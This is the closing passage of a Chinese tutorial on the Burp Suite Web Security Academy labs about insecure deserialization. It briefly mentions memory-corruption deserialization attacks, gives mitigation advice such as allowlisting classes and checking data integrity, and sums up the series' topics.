### <a class="reference-link" name="%E4%BD%BF%E7%94%A8%E5%86%85%E5%AD%98%E6%8D%9F%E5%9D%8F%E5%8F%91%E5%8A%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB"></a>使用内存损坏发动反序列化攻击

这一节burp并未进行详细的讲解，感兴趣的同学可以自行搜索相关的文章，这种攻击方式危害性更大，因为不需要构造工具链并且往往可以远程执行命令。

### <a class="reference-link" name="%E5%A6%82%E4%BD%95%E7%BC%93%E8%A7%A3%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%9F"></a>如何缓解不安全的反序列化漏洞？

应该尽量减少序列化与反序列化功能，并且一定要在开始反序列化前就进行审查，因为前面有讲过魔术方法，就是在反序列化过程中发动的，或者可以限制指定的类和属性才能被序列化和反序列化，并且检查序列化数据的完整性。



## 总结

以上就是梨子带你刷burpsuite官方网络安全学院靶场(练兵场)系列之高级漏洞篇 – 不安全的反序列化专题的全部内容啦，本专题主要讲了序列化与反序列化的原理，以及反序列化攻击的形成原理及利用，如何构造工具链，利用不常用的PHAR协议发动反序列化攻击以及反序列化漏洞的防护等，感兴趣的同学可以在评论区进行讨论，嘻嘻嘻。
